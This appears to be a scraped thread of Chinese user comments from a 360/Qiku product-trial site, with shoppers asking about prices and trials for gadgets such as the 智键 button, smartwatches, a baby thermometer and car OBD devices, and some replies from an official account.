不知道今天会不会收到呢，昨天可是收到信息了呢。真的好期待啊。
当然啦，本来想下班回去用相机拍的，这样还能看清楚手机界面而不用依靠截图，等不及就先整理发出来了，回去再补充。
操作方便也是操作软件方便，但是方便之余让你出现风险还是不好的 
没有的飘过
这么多照片就没一个带上智键的
你的反馈智键君收到啦~我们会不断改进的。
如果有图反馈就更好啦~赞一个。感谢反馈~
建议很到位呢，感谢亲的反馈~ 
今夏注定是凉爽的季节~~~抓拍到好玩儿的也可以跟大家共享一下~哈哈哈
小小的卡片，小小的心意，是送的呢！
话说“小小神钉”把智键君萌到了，哈哈哈哈。 名字不错，反馈很认真喏~赞一个先。
嘿嘿，谢谢给机会让我体验尝试！
（撒花撒花~）亲们评价和意见是我们努力的方向和动力。 兼容性的问题，在后期的软件版本中会不断改善。感谢亲的反馈哈~
太棒了！谢谢亲提出了宝贵的反馈意见。 关于APP水土不服可能跟小米桌面和硬件适配关系。 平板呢，智键君要说的是：智键不建议使用在平板上哦。 我们会不断努力的~  
谢谢智键君，我去论坛瞅瞅，有新问题一定第一时间反馈哈^_^
老实说，这是个很好的产品！高端智能，科技生活啊！不过上次那个试用比较对我有用，这个感觉对我没用，就不申请了。。。可惜上次那个360智键没申请到。。。
恭喜 恭喜 恭喜
亲，智键君要恭喜你成为智键使用官~（撒花撒花） 智键插在耳机孔上，关于“无法使用耳机”指的是蓝牙耳机么？
试用报告提交后没有反应呢
测试一下测试一下测试一测试一下测试一下测试一
哦哟，图拍的不错哦，赞一个~感谢对智键的支持，每次听到鼓励表扬和意见，智键君真的很窝心呢。试用有什么意见和问题欢迎继续反馈哦~
首先~撒花撒花。恭喜345试用官拿到智键。 通知栏里的智键图标是可以关掉的，在设置里面。（智键君也是强迫症患者） 快门声音有可能是系统自身无法关闭哦。关于闪拍呢，因为保证了速度，所以无法对焦的情况是存在的，但是只要手不抖，拍照效果是不错的（已经有过反馈，戳这里http://qikoo.com/try/paper?id=532a6ecbc84a8a221e000075）。
看起来确实不够圆润，手感应该一般，不过公测版也可以理解，另外想问下智键团队，什么时候能购买啊？
哈哈，是吗，那再接再厉吧
智键君是官方账号吗？请问什么时候能买到正式版的产品
太棒了！！！！把智键和硬币比较～真实特别赞呢，意见把你的反馈贴到论坛上啦～
已经已经，失误失误～
额。。不能说廉价吧 = = 像防尘塞是必然的吧，不过要是有造型就更好了~
有啊。。我怎么看到了
拍照的时候，按下去，会不会卡一下才开始拍照呢？
同~~希望这次人品能爆发一下，哈哈~
恭喜啊。这个东西看大家的报告整体都很看好啊。
这个就应该做成简单的样子。如果太花哨就抢了风头。主要还是得看功能是不是用的很舒服。
看来大家都逐步收到奇酷发的智键了啊。恭喜啊。
恭喜恭喜。
这个测评报告，我感觉像流水账单，没什么实质的意见，常规功能任何一个拿到390儿童卫士的人都会发现，但是别人想不到的或者难以想到的才是奇酷网、360所需要的，毕竟人多力量大，越多的意见才会使戴着360儿童卫士的孩子更安全。
“把点击次数和功能结合起来就好了，比如说设置好自己的爱好顺序后，点一次，打开第一个，点两次，打开第二个，当然，次数是有限制的哦。”这条建议很靠谱啊~~@智建君 来看看？
是呀！如果360儿童卫士像手表一样很容易就去掉，那么在炫酷的功能也是白费功夫，所以本人觉得大家应该多想想怎样为孩子的安全考虑，这才是出发点。
智键君满满的感动（都别拦着我，让我哭会儿）。看到这么窝心的反馈，也不负我们熬夜包装的良苦用心。感谢你的建议和反馈，我们会更加努力的！
哇~这么多有用的建议，智键君在这里感谢小伙伴的反馈咯，插入智键莫名其妙启动其他事件，可能是和系统兼容性的问题导致的。闪拍功能我们追求的速度，所以对焦情况不能保证，只要手不抖，拍出的照片还是很清晰的，超级功能因为是新加的，还没有来的及反应在说明书上。以后我们都会注意的~谢谢小伙伴~
面包会有的，牛奶也会有的！
应该叫智键妹
希望这次可以成功！终于找到这样一个接地气的平台，实在是太令人兴奋了！永远支持奇酷网、支持360！！
一直想要的东西,从开始策划的时候就一直关注,希望能参加这次的测试资格
不是吧，这个看着很不错，很实用的啊，重要的是外观和性价比均衡
表示这个配色真心不好看。。。
表示这个配色真心不好看。。。
说实话，创意还行，但型也太难看 ，够酷但不上档次
说实话，创意还行，但型也太难看 ，够酷但不上档次
说实话 创意还行 但型也太难看 够酷但不上档次
说实话 创意还行 但型也太难看 够酷但不上档次
貌似不太好看，即使功能好用，也不会买的
这个表太难看了没我设计的好看
这个网站有欺骗性，我在去年大约11月份认筹了一件产品，到现在也没有收到，只是在春节前接到他们从杭州打来的一个电话让等等，之后就没有下文了。现在想和他们联系还没有办法，这个网站上没有任何可以联系他们的方式，我的账户中认筹的产品信息和资料也消失无影无踪。如是你们奇酷工作人员看到后请和我联系。
能不能送个情侣试用一下啊、？
识别动作准确度怎样，不要弹吉他它反而发出枪声。。。
有了这个以后不用担心丢东西，找不到东西。对于儿童和年纪大的爸爸妈妈也是一种关爱和保护!挺
感觉是为我设计的，像我们这种爱丢三落四的人，有了这个妈妈再也不用担心我的生活了
好东西,以后出行的行李箱内可以放置这个，还有钱包里。还有丢了好几次的自行车。。。
看到它就感受到科技~小身材最棒了
赞、期待上市
赞一个赞赞赞
酷炫 到底 期待上市
很不错，很实用，期待。。。
这个好，很实用。赞一个。。。。360加油！！！
期待中，...
非常期待产品的到来
很好很好~~~期待中！！！
这个实用性很广！是个不错的设计！
好 赞一个
还蛮不错的
非常期待之中
不错，感觉挺实用的
百度logo乱入~~~
不错 挺人性话的 好
很想把玩一下！
真好看，能想要
外形设计更符合手表，功能也较全面，很想试试看！
太喜欢了，送我吧，我将告诉更多的人
希望我可以得到它
赶紧出啊，出了必买！
防水的吗？？
防水的吗？？
真心喜欢 ， 速度啊。。。。
看着就很有感觉，come on!
炫酷，等着等着了
韩期待的，简洁的，大气的美物
漂亮，新奇，我想要，555
这个可是真漂亮啊！~
比目前市面的智能表都好看，期待尽快试产！！！
哇，太酷啦，希望也能有一支
太棒了,,争取快点推出,等着买呢!太酷了
希望快速出这款手表，可以让大家先试用，慢慢改进，需要的是速度。被小米抢先就完了。。。。
特别喜欢智能手表　特时尚　等着买个
希望不要太贵才好
很喜欢~~很期待~~
看起来不错。怎么购买
圆形屏幕可以隐藏的很深啊，上课的时候。。。。
未来智能生活的缩影
这个太赞了，给力！超喜欢
手表耗电量会不会很大，希望能采用太阳能和充电双重方法
它和其他手表有毛区别？
看上去不错，按钮显得过大。
看着不错的东西
正好缺一块这样的JP
圆盘比方盘漂亮，这款智能表出来，肯定会大热大卖。实在期待。
奇酷是个无节操的网站，什么玩意都收罗。比如特斯拉需要你往这儿收罗吗。。。真扯淡。。
好期待。好创意。
大爱这个手表
不错的产品题定一个
期待产品。
外形挺不错的
很酷，很不错啊！很是期待
这个手表看着太赞了，是我的菜！
原来只是一个外观设计？扯淡
赶紧出吧！
期待啊 什么时候出啊 只要不是太贵就好了
希望这款手表的体积不会太大，期待快点看到实物。
这款手表真的非常喜欢，是我的理想型啊，希望能马上推出啊！！！
这个什么时候能试用呢 很期待。。
赞。。。。。
不知道价位如何，是否是大众价
能不能创新出个其他的。我自己虽然有，最大的缺点是易脏。
小度wifi盗版你们，还有小米，难道没人管吗？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？
很满意 我这帮同学 抢的要买
为什么一起买两个比单独买一个一个买贵呢 这是为什么~！！！
手机不管用吗？
很不错、刚收到货就迫不及待的试了、很满意
我买了很不错，比百度的强~百度我弟弟买了，很垃圾！
原来现在还没有可以买呀
好产品啊好产品
可惜要安卓4.4以上
赞 期待
赞 期待
高端大气上档次，漂亮，期待啊
这个可以 觉得挺新鲜。。。
超赞我喜欢
SHUAN
赞！我喜欢这个宝贝
很看好这款宝贝，什么时候发行啊？
期待啊，QWQ
期待...
我也很期待这款产品。。。。支持你！！！
期待这个作品~
太棒了，真想来一个啊。。。。
这个作品不错。很喜欢
这个作品不错。但它的功能可以发短息可以聊天的吗
很喜欢这个作品，感觉挺好的，
喜欢。。。
看着很赞啊！
真好，是否考虑防水，防震，防碎吗？最好按照金戒指的外观美观，这样天天戴着要有酷的感觉！
很棒，永远支持
好东西期待
期待中。。。好像来一个。。。
几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。几个问题。。主要还是识别的问题，对单击双击的识别。。
看着还不错
会不会得骨癌？这个微波产品一直套在指头上呀
几个问题。。主要还是识别的问题，对单击双击的识别。。
就不知道灵活度过怎么样
我想找出他的不足
期待，希望能在短期内实现
给我就好了
165美元。。。比手机还贵。。有没有搞错啊！
好是很好 就是没钱卖
真新奇，想用。
这玩意儿好牛比！
好贵啊 6000多
看起来真不错，现在可以申请试用了吗？什么时间发售呀？期待中。。。
nice，上市就买
好东西不一定能发明出来吧
霸气侧漏的感觉 期待
是个好东西
这个真心的太想要了！！！
很有期待性
希望能使用下。
超薄最好了，不过肯定要防水啊，续航能力也是
很想试用 比知道可以吗
携带方便期待试用！
是个好东西，・可不可以出Windows Phone8的
有趣 希望成品不会太大
携带方便操作有趣
是个好东西
请问・・可不可以出Windows Phone8的？ 如果能就谢谢了~
太赞了！！！
随身携带，不需要时时拿出手机或平板，赞啊。小巧，戴在手上也很时尚啊。
创意很不错，但现在作为推广而言没有相对应的产品作支撑，有几个家庭能在未来十年实现数字化家庭，但研究的步伐还是不能停，没准20年后就能成型了，加油！
很期待 希望别太贵
好棒哦，比起美国那个智能腕带要小了很多哦，这么酷，期待试用！
这个创意不错 不知道好需要多久才能面世呢
期待这个产品的问世
很棒的产品，希望能早点试用！
感觉太好了 希望赶快出来
好东西，不知道上市价格多少？
这真是太coooooool了，很期待
感觉很赞，不过感觉戒指不好。
太棒了 早日发放吧
介个很强大啊！陀螺仪芯片已经可以做到那么小啦？360其实可以开发一款类似的手环，使用手环内侧的肌肉感应功能来感应手指的动作。或者将手环和戒指用一根装饰带子连在一起也行。
这个东西实在是太好了，以后开车人就可以自我约束一些不好的驾驶行为，为我们平安交通做贡献。
希望也可以做成行车记录仪，防碰瓷，那就更完美了
这个产品绝对得赞一下，以后肯定能卖疯了。
其实如果给地图导航软件上安装一个插件，是不是也能达到类似的效果？
其实如果给地图导航软件上安装一个插件，是不是也能达到类似的效果？
其实如果给地图导航软件上安装一个插件，是不是也能达到类似的效果？
我老爹肯定喜欢
这个网站有欺骗性，我在去年大约11月份认筹了一件产品，到现在也没有收到，只是在春节前接到他们从杭州打来的一个电话让等等，之后就没有下文了。现在想和他们联系还没有办法，这个网站上没有任何可以联系他们的方式，我的账户中认筹的产品信息和资料也消失无影无踪。如是你们奇酷工作人员看到后请和我联系
好东东，好创意
创意挺好 期待。。。
期待中。。。
公司的车都可以装上，可以调整平时的行车路线习惯，挺好的。。。
这个真的很好，希望快点出，一定购入。
这个不错，一直想找个类似功能的app，但没能如愿，试用一定申请。
这个好，希望不要太贵。
这个我可以试用下哦~天天开车的说
的确。奇虎开始走了周边产品。这路子就对喽。不能跟强盗Q比。各种绑架IDY恶心内。。。。。。这个怎么卖？
看起来蛮好玩的
希望不是“永远找得到停在那里”而是“永远找得到在哪里停”
很好的创意，买！！！
这是做什么用的呢？
只要价钱别太离谱――买！！！
很好安全驾车
上市我就买
看是不错，用起来应该很好用
不错好东西
这个东西，不光开车能用，我去徒步爬山更能用的上啊，赞一个
貌似挺不错
看样子很好玩，
最好具有行车记录仪功能。驻车记录周围状况功能。
可以把行程记录仪功能也带上就更好.
希望能接收到车辆的所有信息，并发出相应提醒，可以让驾驶者一幕了然。
只能穿戴和智能车载应该成为之后科技公司的主打啊。
生活 越累越牛比。。。。。。。。。。。。。。
智能车载装置看来也是未来趋势啊。
车联网 这个更可怕，，巨头们要布局了
这不是红点奖2013的产品吗？
可以跟小米学习啊，工程机先给我们测试，然后在不断改进。
外观太丑了，圆形的设计不符合工业设计，费空间、费材料。。。。
- -洗衣机路由。。
期盼试用活动！
最爱是你(期待试用！)
什么时候免费使用给个呗
免费的啊 给我来个
都求购买新产品试用，功能的完全信用。
这岂不又要购买更新好多的海尔电器了？海尔盯着我的口袋，我期待使用。
还没发布啊
我觉得这个海尔是骗人的
新颖，期待使用
一直关注！！
期待试用！
期待试用！
期待着使用。
伤心太平洋
期待着使用。
看是采用什么FR 射频协议，配套的开关，红外转发是否完善！
结果比较不错 前期设置应该是超级麻烦。
可以试用吗
求试用！！
非常喜欢这种智能家具控制器，什么时候上市
能试用吗？
不错 一直支持360
真心不错，很喜欢！
支持支持，支持
这个符合时代产品的需求，
希望加上湿度以及温度计功能！
看好这款产品，室内测空气，方便开不开窗户，但产品外观孔点容易粘灰尘，最好要考虑方便拆机清洗。
怎么才能买到
360，果然是新产品、新创意的研发团队。这款产品的试用品更期待中。。。
这个绝对有市场，我很看好
这个有市场，能够大麦的。
如果能用在车内就更好了，改成车充的，放在车里也可以知道什么时候该开开窗换下气了，用灯光的颜色来表示优、良、差就更好了！
哪里能买到？
这个不错！有需求
赞~~~~~~~~
只能记录，可空气另需改善。
我也想要。。
简直是当下居家神器嘛~ 赞！
新家能用，需要
看起来不错
期待能如描述的一样好！
这个好不错！！！！
真赞！期待啊！
期待是不是真的有介绍的功能那么好
样式很好 功能不错 期待
作为环保专业人士，对此抱有一定的怀疑态度，如果一个这么小的东西都能检测这么多种指标，还要专业仪器干什么？
时尚简洁大方，很喜欢很期待
确实要研发一些智能的东西啊！
比贝虎强多了，期待
挺时尚的，我喜欢。
一直对三星的手机情有独钟，尤其是S5充满了浓烈的三星风格，期待
特别想要，作为原三星员工，对于三星的产品研究很深，而且身边大部分人受到我的影响都买了samsung手机和平板电脑，特别想尝试一下它最新的指纹解锁和心率测试，不过内存容量相比之下比Note3要差一些，希望在ROM方面得到改善
能申请么？
可申请咱也来
很炫。。。。。。。。
这个能申请到吗？好像白日做梦吧？不可能的吧？
什么时候开始申请啊？迫不及待了~~
很好 感觉不够强大
亲，我想要哦
漂亮，good nice
啊啊！梦想机啊！
做梦都想要啊，
外观感觉不错
这个表面设计我很不喜欢 设计师知道很多人都有一种病 叫做密集综合症吗 不知道就去百度吧 还是S4的光滑设计好
不错很强大
期待 ..................
如果手机可以发展成可折叠式的多好，平时是手机，关键时可以当平板用要是每个月可以免费送几台就好了，我们这样的穷鬼也有机会用用
不错，很期待啊
不错 喜欢 期待拥有
【神马！S5会有高级版本？】据外媒Etnews报道称，三星GALAXY S5的高级版很有可能会在不久后推出，命名为GALAXY F。传闻该机在S5的基础上，配备2K屏幕，3GB RAM，32GB存储，全金属机身，搭载未发布的64位处理器或八核Exynos 5422。如果真是这样，S5+GALAXY F+Note4，三星要走一年3旗舰的路线？
为什么三星没有出2k屏幕，难道需要等note系列出吗，还是如果用2k屏幕电池受不了，光看配置上去了，电池没什么进展
为什么没有枚红色呢？
这个可以有
热切期盼着
可以试用一下么！
能极简不？
无线加速，300M啊，不要比百兆有线还拖油瓶、。、家庭数据中心处理，速度要上的去啊
热切期盼试用活动！
热切期盼试用活动！
有试用吗？
还没用过啊
可以试用一下么！
有试用吗？
持续关注，有没有试用啊
没有试用吗？
有没有试用啊？？？？
也来求测评。之前见朋友家有用的，节目倒是很多，但是关键的节目都看不了，网络速度也是一般
求评测啊抓紧啊
很棒的赶脚。
理想是好的。但是准不准确呢，会不会出错误呢。现有的电子体温计好些都不准。
理想是好的。但是准不准确呢，会不会出错误呢。现有的电子体温计好些都不准。
产品贴在腋窝会不会有不适或者容易脱落的现象
产品贴在腋窝会不会有不适或者容易脱落的现象
产品贴在腋窝会不会有不适或者容易脱落的现象
产品贴在腋窝会不会有不适或者容易脱落的现象
产品贴在腋窝会不会有不适或者容易脱落的现象
产品贴在腋窝会不会有不适或者容易脱落的现象？
创意十足 赞！！！
对于现在的年轻爸爸妈妈真的很适用，期待，希望价格不要太贵
小产品，好创意
怎么没有写价格啊，我要买啊啊
好产品，妈妈再也不用担心不知道宝宝的体温了！！！
你们在产品没出的时候都已经用了？牛人啊！！！
酷啊期待哦
酷啊期待哦
我家宝宝也刚出生不到2个月，希望这个产品的固定方式能用其他的方式而不是这这样的贴纸，每次洗澡后的佩戴是个麻烦，而且测量体温应该准确，还有宝宝在睡觉的时候衣物或者被子等 加多了体温也应当会提高这样也应该提醒减少衣物或者被子等，而不光是测量发烧的体温。
好产品，妈妈再也不用担心不知道宝宝的体温了！！！
你们做这个产品的时候有没有考虑过孩纸的双手是不老实的。。。。。。
这个我现在正需要，宝宝刚16天
315女儿6岁生日，当礼物送她，一定很开心。
儿子差不多5岁了，想想这几年，儿子有时感冒后，给儿子量体温是做父母最头痛的事【水银的准确但是时间长儿子不接受；电子温度计经常失灵--包括耳温枪】。创意很好，希望把握2个点：1、测量出的温度必须准确；2、材料应该让儿童不反感；3、测量时间不超过1分钟为宜。
这个是我最期待的 加油
宝宝刚出世两个月，希望能用上豆芽。。。
外观很好看 宝宝快出生了 希望这个豆芽早点上市~
不错，但这个好像是直接贴在宝宝的腋下，这对宝宝皮肤什么的啊有伤害，有点问题。
这个是好东西，家里有宝宝的都有潜在需求，就是不知道该如何试用。
小巧可爱呀..
关键是要数据的准确性有保证，还有就是适应性要强，不要因为环境变化给测量结果带来影响
好东西，希望能尽早走上市场。
非常好 用水银的一般都需要十分钟 时间长不说 还有危险 这款智能体温计可以实时监测孩子的体温 真是太了不起了 喜欢
恩恩 小孩也不会害怕 好东东
不错，期待
这个东西倒是不错，可以及时掌握了，用水银的还真不是很安全。但是不知道精密度怎么样。怎么试用呢？
高端大气上档次
中国能卖的奥么
特别喜欢这个东西，期待马上，然后我就买俩，我们一人一个 ，呵呵呵
有试用吗？俺想试用.。。。
俺想试用。。。。。
期待啊。。。想要个。。
刚好手表坏了，怎么试用呢？
好看但不知使用么！
应该是很好的东东
好看，不知道好不好用，
想要个ing
求试用求试用
什么时候可以使用
求试用啊...高大上
蛮有意思，喜欢中~~~
能不能防水呢？
前一段时间就关注了三星的这一款可穿戴设备，能够在奇酷网上出现试用，的确是给大家了不少福利！
曲面屏幕我很喜欢，UI设计不错，如果能够尽快开卖那就太好了！
设计很不错，不过横屏的显示状态不是太好...
不错 我喜欢 什么时候能使用
我喜欢！不错！
这玩意！我喜欢！不错！！！
还不错哦！很期待 奇虎现在都出些比较高端的东西 真的赞一个 期待中.....
什么时候出，看上去很好
看上去不错呀，可以试用？
赞一个~不错
这个看上去比gear有吸引力且实用啊
修长的弧形屏幕极具美感
什么时候能普及了就好了
设计的不错，很漂亮
这么多可穿戴 目前最好看的就是这个
看上去不错啊！
没用过这样的玩意，看上去不错
比galaxy gear实用
看样子不错！！！！
三星终于推出个有创新的东西拉
希望可以得到试用的机会 支持奇酷
14号抢x1 希望b1早日上市!
还没有上市嫩恩恩
申请，申请
好想要一个
真的吗 太神奇了 不过这价格如果有试用的话 就申请一个
看起来不错啊，就是不知道重不重
每天锻炼，求试用。
样子不错 功能只知道蓝牙耳机 别的还是拭目以待 价格吗 貌似贵了些
不知道运动方面是怎么设计的 求试用
可以使用吗？？
求试用，太好了
一直运动都想要一个检测工具 可是苹果之类的太贵实在买不起 华为这手环真心喜欢
太棒了，求试用
酷毙了，求使用啊？
太帅了.求试用
求试用，很喜欢
蛮酷的。求试用
期待啊 。希望能实用，贴近生活吧，不要像有些手表玩花招不实用。
喜欢，求试用
求试用期待中
好东西，很喜欢，求试用
好高级...
好喜欢的说啊。。。。
喜欢，期待，想快点试试
太棒了，是我想要的，求试用
期待！想试用！！
太棒了，一直是我想要的，求试用
很期待！！！
因为金属过敏，两块上万的手表都不能带了，期待中
太棒了！想试用！
如果内含GPS就完美了。
挺时尚的，喜欢。
多少钱啊 在哪看
挺时尚的，喜欢。
价格贵了，真的，
东西看起来不错，不知道什么时候能够使用？
非常不错，很喜欢哦
太棒了，一直是我想要的，求试用
什么东东？三星也做 谷歌也做 华为也做？如此神奇的商机？求试用！求详情！
加油，给予关注
希望第一时间通知.
华为加油！别让国人失望
挺有创意，主要还是实用！
这是三星gear第二代，希望能体验一下
酷酷，我想要，很好
什么时候联想也出智能手表啊
想送老婆一个
很期待这款手表，希望有机会能够使用它。
哇，看起来超炫，及多功能与一身呀，
能送我一个吗？
看起来很不错
非常喜欢三星的产品，本人也是老用户了，希望快点出来，让更多的人使用它。。。。
老早就想着有一种具有MP3+电话+收音机功能的手表。
常喜欢三星的产品，本人也是老用户了，希望快点出来，让更多的人使用它。。。。
一看我的眼都大
哇，一看就好喜欢哦！
非常喜欢三星的产品
三星的产品不错，很想使用它。
非常喜欢三星的产品，本人也是老用户了，希望快点出来，让更多的人使用它。。。。
非常喜欢三星的产品，本人也是老用户了，希望快点出来，让更多的人使用它。。。。
太想要了，求试用
好想要好想要
有它就方便多了，什么时候试试啊
我的S4可以用吗？！来个试用一下吧~~超感兴趣！
来一个试用的吧
想试用，不知道我有机会吗？
高端，大气，时尚，精致，我喜欢，也需要呀，给个名额吧
给我试用一下吧
看上去就是高档货，给个试用下呗亲
等待试用，很时尚化！
我要啊，亲
试用叫上我！！！哈哈
求试用啊亲
so fashion
我喜欢，设计奇妙。高端大气 摄像录像有点谍战风
呵呵，上市咯
很适合健身和夏天跑步使用，平时带也很好看
这样子很前卫
我喜欢，设计奇妙。
能通话么！！！
1已经出了，2还没上市
高端大气 摄像录像有点谍战风
看着不错啊，持续关注
看着就很喜欢
看着不错啊，持续关注
看着不错啊，持续关注中。。
多钱门那你
不错的样子 ……
看起来很不错的
怎么没有价格。
详细记录行驶数据的话现在很多行车电脑自带就有，包括瞬时油耗、平均油耗、平均速度、行驶时间等等，希望这个能监测到实时数据，然后可以跟汽车生产商合作拿到标准数据值进行比对，然后分析出车子什么地方有毛病，提早预防，这样还差不多，对了，可以加入行驶里程记录，提醒车主什么时间该包养了，包养什么项目等等。当然，你也可以加入GPS，免得大型露天停车场找不到车在哪里，地下停车场没有GPS信号，你自己想办法解决一下
售价$100？还是算了吧，不到人民币100的ODB都能实现！
这个创意是不错，但是有点虚。。。。。估计这一两年不来什么重大技术突破变革，还是会留在创意阶段
期待中，这样的新鲜玩意
支持，期待中
这个真是个很好的创意，非常喜欢，几个时候可以试用呀非常期待中。。。
看介绍就知道肯定是好东西，才100刀，忒理想的宝贝，热切期盼
这是什么功能啊
看起来还不错哦，就是不知道用起来咋样啊
这个就是蓝牙OBD检测器，国产的只要50多块钱。。。
物业想要太好了
我现在就想要一个，放在车上看看什么情况，已经关注过类似的商品，因为一直相信360，所以想试试360的这款商品。
特别需要这样的东西来帮助我改掉一些坏毛病
如果真有宣传的那么好的话，就先给个赞~！期待能使用到。
这个看起来不错 看看什么时候可以使用下
完美，，，，，，，，，，，
没车。。。。。。
这个实在是太好了，我喜欢。有机会让我们也试试就好了。
好东西大家一起分享了啦
让生活更简单，想使用
太好了 我要
我要！我要！我要！我要！
好东西支持
什么时候可以使用？
不错，想试试
有使用资格吗，期待呀
跟车联网的东西，有点兴趣，不知道什么时候可以试用
这个车是奔驰的GLK吧
喜欢驾驶和摆弄汽车，想试试
一个喜欢出去自驾游的行者，急需一款这样的超级宝贝，让旅途充满关爱。
对于一个司机来说，我很好奇，它会给我的旅程带来什么样的惊喜呢
怎么申请试用？
我喜欢，不知道什么时候能够试用。
这个就是车载电脑的外延，属于车联网的范畴，未来在汽车产业中应该会比较普及。相信这几年就可以看到越来越多的汽车标配此类功能，而无需通过设备外接实现。当然，对于存量汽车，类似的产品还是很有意义的。
思路不错~求试用
怎么申请试用？
产品特点类似于飞机的黑匣子，期待，申请试用。
我喜欢。申请试用！
我是个好奇心很强的车主，我很喜欢新鲜的事物，而且我有一颗有责任感的心，所以我会很负责的做好试用工作，交上一份满意的答卷。
没用处，太贵
申请试用啊
求试用啊！！！
求试用，大爱此产品
申请试用，我是车主！
新品试用，申请试用
新品试用，申请试用
这个能检查钢材的化学成分吗
能不能检验检验血液啊 尿液啊之类的啊
不知道价钱怎么样呀
真的假的。。。。消耗 ， 供电 都是问题啊
好创意好棒，好方遍
好棒，好方遍
汽车尾气能否分析？
什么时候出？分析化学系。。。
希望能够检测出空气中的污染气体含量及类型。
真是为了我们人民大大打击非法物质 ，有详细改善。
请问被检测物质种类能够达到多少种？刑事化学系期待您的回答
买个吧，要不我这个侦探怎么当【开玩笑的】
希望能早日面世，期待！！！
是啊 能解测地沟油 花点钱 也可以啊
希望能够检测出地沟油和蔬菜上的有害化学剂
这个真的很好，随时检测，方便实用。
希望能检测地沟油和重金属，这两个现在非常棘手，我们老百姓不在乎东西的化学元素构成，我们只想知道是不是有害的食物，如果能有效的辨别，那我想大家花点钱买个这个应该是不成问题的，基本上准备上亿的销售准备把
很好的东西，就是介绍的不很清楚。
能检测地沟油吗
能检测金属的种类吗
感觉做成勺子的更好 毕竟是吃的健康比较令人关注
一直关注物联网，一直关注Broadlink
一直关注物联网，一直关注Broadlink
就是不知道它的实际效果能不能达到介绍的这种效果。
就是不知道它的实际效果能不能达到介绍的这种效果。
就是不知道它的实际效果能不能达到介绍的这种效果。
就是不知道它的实际效果能不能达到介绍的这种效果。
就是不知道它的实际效果能不能达到介绍的这种效果。
就是不知道它的实际效果能不能达到介绍的这种效果。
就是不知道它的实际效果能不能达到介绍的这种效果。
就是不知道它的实际效果能不能达到介绍的这种效果。
好东西啊，力挺360！
这个网站有欺骗性，我在去年大约11月份认筹了一件产品，到现在也没有收到，只是在春节前接到他们从杭州打来的一个电话让等等，之后就没有下文了。现在想和他们联系还没有办法，这个网站上没有任何可以联系他们的方式，我的账户中认筹的产品信息和资料也消失无影无踪。
用蓝牙更好，红外有阻隔信号就不好了。
这个实现很简单，是创意，不过淘宝上早就有很多这类产品了，实现难度不大。关键是红外线强度。
不知道效果好不好。
上次看到那种已经加入了智能无线遥控报警设置,价格与这个价格一样,加功能不加价.
不知道它要不要受距离的影响。
这个坎上去挺方便，功能也多，不知道实际使用如何
无语了...
这个东西玩玩还是不错的。不知道效果好不好。
哈哈 喜欢 将手机上的视频转到电视
哈哈 喜欢 将手机上的视频转到电视
我的理解是用这个东西把家里的所有可以遥控的家电的遥控器复制一遍，然后用网络来控制这个超级遥控器，可是感觉这个实用性不高啊
得其他设备支持啊。用户体验也必须好，按几次不给力就麻烦了。
产品不错，看到什么的评论它的可开发的空间还有，持续关注中......
看起来很不错的产品，值得支持，我要购买。
这个懂确实需要一定的电子产品知识才能玩转。
看似很强大，又貌似很复杂
控制成功率高吗？客厅，卧室都能控制吗？
WIFI的连接导致这种产品功耗没法做的很低，如果采用Zigbee或者低功耗蓝牙，利用路由或者单独再加入网关节点，那么这个全向红外本身的功耗就可以做的很低，甚至低于传统的红外遥控器，就可以直接粘在天花板上。放在桌子上很容易被阻挡，影响控制成功率。 和路由结合吧，作为路由的配件，换成低功耗的通信方式，由路由作为网关。
如果能做的更智能一些就好了。软件也应该做的更人性化一下。
红外转wifi 外形设计还不错
别忘了，这个东西不光需要开蓝牙，还要后台，电能啊，精力啊，你伤不起的！
这个东西很久以前就用过了，不实用，再也没用过，现在手机本身就耗电，还开蓝牙，作死。再有就是一天都开着还要去管理（至少你得去看看电用完没），累不累啊！
稍微大了一点，其他不错
我手机不是诺基亚啊
这个很实用，上火车把它放在包里，放在行李架上，包就不会丢了。真的不错！就是不知道距离够不够。
感觉非常好的东西，尤其是经常找手机钥匙的我 呵呵
感觉怎么样朋友，有用过的吗给点意见
同意楼下的说法
应用早就下好了，坐等试用
对于丢三落四的人来说是件至宝
蓝牙功能，价格还贵
是BLE技术还是蓝牙2.3的，前者95%手机目前用不了，后者呵呵，太耗电
这东西挺稀奇的啊
工作原理是什么？
重要的东西多了去了。。。。
我想问如果手机丢了怎么办？给手机发也是白发啊
老诺加油啊
喜欢 希望能试用下
喜欢，非常喜欢
如果带有USB口，支持网络分享、脱机下载就更好了。
期待啊，希望能成为家庭智能中心
啥时上市啊？
看配置应该是比较顶级的，希望不会失望，如果能够获取资格，并且使用效果好的话，我将推荐给业界人士，估计会有公司采购
等的花儿也谢了。。。。。速度
哇啥时上市哇真的够酷
很给力的一款。
等好久了。。
等老久了呀，还没出 期待很高喔
很酷的感觉、
嗯，等了很久了，可就是一直没有拿出来卖，难道还在不断的完善吗》
现在没有消息了
很想用来着
很想用来着
能不能早点上市，最好做成各种各样的，如动物、人物。
真想有一个，不用有时候找东西都要半个小时
什么时候上市
等好久了。。
期待上市。祝愿360公司能越来越好
什么时候出？
这几个数字不太好看，改改换成360安全卫士的圆形图标
样子不怎么样，现在智能路由已经很多在做了，这个没有什么突出的特点！
黑色的，好可爱。给人一种爱不释手的感觉
等等等...超想买的！
RAM小对运行速度产生影响吗？
RAM可以提升吗
360就是牛，这么好的创意和功能，贴心实用，为用户带来福音了，期待360做出更多更好的产品。
还不开售？
还不能买啊？
